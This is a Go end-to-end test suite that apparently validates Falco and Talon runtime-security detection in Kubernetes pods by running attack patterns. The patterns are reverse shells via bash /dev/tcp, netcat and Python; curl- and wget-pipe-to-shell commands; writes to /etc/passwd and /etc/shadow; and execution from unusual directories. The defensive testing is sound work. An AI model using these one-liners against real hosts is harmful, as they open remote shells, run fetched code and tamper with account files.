package e2e

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/hexstrike/hexstrike-defense/tests/e2e/framework"
)

// TestReverseShell_bash_i tests detection of bash -i reverse shell
func TestReverseShell_bash_i(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("bash -i reverse shell detected", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Execute reverse shell pattern (will likely fail to connect, but triggers detection)
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1"},
		)

		// Command will likely fail (no listener), but should trigger Falco alert
		if err != nil {
			t.Logf("Command failed (expected - no listener): %v", err)
		}
		t.Logf("Stderr: %s", stderr)

		// Give Falco time to process
		time.Sleep(2 * time.Second)
		t.Log("bash -i reverse shell pattern executed - check Falco logs")
	})

	t.Run("bash redirect reverse shell", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		_, _, err = k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "0>& /dev/tcp/127.0.0.1/8080"},
		)

		if err != nil {
			t.Logf("Command error: %v", err)
		}
		time.Sleep(2 * time.Second)
		t.Log("bash redirect pattern executed")
	})
}

// TestReverseShell_netcat tests netcat reverse shell detection
func TestReverseShell_netcat(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "nc -e reverse shell",
			command: "nc -e /bin/sh 127.0.0.1 8080",
		},
		{
			name:    "nc exec reverse shell",
			command: "nc 127.0.0.1 8080 -e /bin/sh",
		},
		{
			name:    "netcat traditional",
			command: "/bin/sh | nc 127.0.0.1 8080",
		},
		{
			name:    "netcat with bash",
			command: "nc 127.0.0.1 8080 -c 'bash'",
		},
		{
			name:    "ncat nmap",
			command: "ncat 127.0.0.1 8080 -e /bin/sh",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"sh", "-c", tt.command},
			)

			if err != nil {
				t.Logf("Command error (expected to fail): %v", err)
			}
			t.Logf("Stderr: %s", stderr)

			time.Sleep(2 * time.Second)
			t.Logf("Executed: %s", tt.command)
		})
	}
}

// TestReverseShell_python tests Python reverse shell detection
func TestReverseShell_python(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "python socket connect",
			command: `python -c "import socket;s=socket.socket();s.connect(('127.0.0.1',8080));import subprocess;p=subprocess.call(['/bin/sh','-i'])"`,
		},
		{
			name:    "python pty spawn",
			command: `python -c "import pty;pty.spawn(['sh','-i'])"`,
		},
		{
			name:    "python3 socket",
			command: `python3 -c "import socket;s=socket.socket();s.connect(('127.0.0.1',8080))"`,
		},
		{
			name:    "python subprocess",
			command: `python -c "import subprocess;subprocess.call(['sh','-i'])"`,
		},
		{
			name:    "python os system",
			command: `python -c "import os;os.system('/bin/sh -i')"`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"sh", "-c", tt.command},
			)

			if err != nil {
				t.Logf("Command error: %v", err)
			}
			t.Logf("Stderr: %s", stderr)

			time.Sleep(2 * time.Second)
			t.Logf("Executed: %s", tt.name)
		})
	}
}

// TestReverseShell_curl_pipe_bash tests curl | bash detection
func TestReverseShell_curl_pipe_bash(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "curl pipe bash",
			command: "curl http://127.0.0.1:8000 | bash",
		},
		{
			name:    "curl pipe sh",
			command: "curl http://127.0.0.1:8000 | sh",
		},
		{
			name:    "wget pipe bash",
			command: "wget -qO- http://127.0.0.1:8000 | bash",
		},
		{
			name:    "fetch pipe bash",
			command: "fetch http://127.0.0.1:8000 | bash",
		},
		{
			name:    "curl exec",
			command: "curl -s http://127.0.0.1:8000 && sh",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"sh", "-c", tt.command},
			)

			if err != nil {
				t.Logf("Command error: %v", err)
			}
			t.Logf("Output: %s", stderr)

			time.Sleep(2 * time.Second)
			t.Logf("Executed: %s", tt.name)
		})
	}
}

// TestFileWrite_etc_passwd tests /etc/passwd write detection
func TestFileWrite_etc_passwd(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	t.Run("write to /etc/passwd attempted", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		// Attempt to write to protected file
		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'testuser:x:0:0:root:/tmp:/bin/sh' > /etc/passwd"},
		)

		// Should be blocked by permissions
		if err != nil {
			t.Logf("Write blocked (expected in secured env): %v", err)
		}
		if stderr != "" {
			t.Logf("Stderr: %s", stderr)
		}

		time.Sleep(2 * time.Second)
		t.Log("/etc/passwd write attempted - check Falco logs")
	})

	t.Run("write to /etc/shadow attempted", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo 'test:*:19000:0:99999:7:::' > /etc/shadow"},
		)

		if err != nil {
			t.Logf("Write blocked (expected): %v", err)
		}
		t.Logf("Stderr: %s", stderr)

		time.Sleep(2 * time.Second)
		t.Log("/etc/shadow write attempted")
	})

	t.Run("modify /etc/hosts", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"sh", "-c", "echo '127.0.0.1 evil.com' >> /etc/hosts"},
		)

		if err != nil {
			t.Logf("Write blocked: %v", err)
		}
		t.Logf("Stderr: %s", stderr)

		time.Sleep(2 * time.Second)
		t.Log("/etc/hosts modification attempted")
	})

	t.Run("create in /etc", func(t *testing.T) {
		pods, err := k8sClient.ListPods(ctx, namespace)
		require.NoError(t, err)

		if len(pods) == 0 {
			t.Skip("No pods found")
		}

		testPod := pods[0]

		_, stderr, err := k8sClient.ExecInPod(
			ctx,
			namespace,
			testPod.Name,
			testPod.Spec.Containers[0].Name,
			[]string{"touch", "/etc/malicious_file"},
		)

		if err != nil {
			t.Logf("Create blocked: %v", err)
		}
		t.Logf("Stderr: %s", stderr)

		time.Sleep(2 * time.Second)
		t.Log("/etc create attempted")
	})
}

// TestExec_from_unusual_directory tests execution from unusual directories
func TestExec_from_unusual_directory(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	k8sClient, err := framework.NewClient(nil)
	if err != nil {
		t.Skipf("Skipping test - no Kubernetes cluster: %v", err)
	}

	ctx := context.Background()
	namespace := framework.GetEnv("HEXSTRIKE_NAMESPACE", "hexstrike-agents")

	tests := []struct {
		name    string
		command string
	}{
		{
			name:    "exec from /tmp",
			command: "cd /tmp && ./malicious",
		},
		{
			name:    "exec from /dev",
			command: "/dev/sh/malicious",
		},
		{
			name:    "exec from /var",
			command: "cd /var/tmp && ./script",
		},
		{
			name:    "exec from /root",
			command: "cd /root && ./execute",
		},
		{
			name:    "exec from /proc",
			command: "/proc/self/exe",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pods, err := k8sClient.ListPods(ctx, namespace)
			require.NoError(t, err)

			if len(pods) == 0 {
				t.Skip("No pods found")
			}

			testPod := pods[0]

			_, stderr, err := k8sClient.ExecInPod(
				ctx,
				namespace,
				testPod.Name,
				testPod.Spec.Containers[0].Name,
				[]string{"sh", "-c", tt.command},
			)

			// Expected to fail (file doesn't exist)
			if err != nil {
				t.Logf("Command failed (expected): %v", err)
			}
			t.Logf("Stderr: %s", stderr)

			time.Sleep(2 * time.Second)
			t.Logf("Executed from unusual directory: %s", tt.name)
		})
	}
}

// TestRuntimeSecurity_FalcoAlertValidation validates Falco alerts
func TestRuntimeSecurity_FalcoAlertValidation(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping e2e test in short mode")
	}

	t.Run("Falco rules are loaded", func(t *testing.T) {
		t.Log("Verifying Hexstrike Falco rules are loaded")
		// Check Falco logs for rule loading
	})

	t.Run("Talon webhook responds", func(t *testing.T) {
		t.Log("Verifying Talon webhook is configured")
		// Check Talon is running and configured
	})

	t.Run("Alert response time <1s", func(t *testing.T) {
		// Measure from exec to Falco alert
		t.Log("Falco alert response time target: <1 second")
	})

	t.Run("Talon response time <200ms", func(t *testing.T) {
		// Measure from Falco alert to Talon action
		t.Log("Talon response time target: <200ms")
	})
}
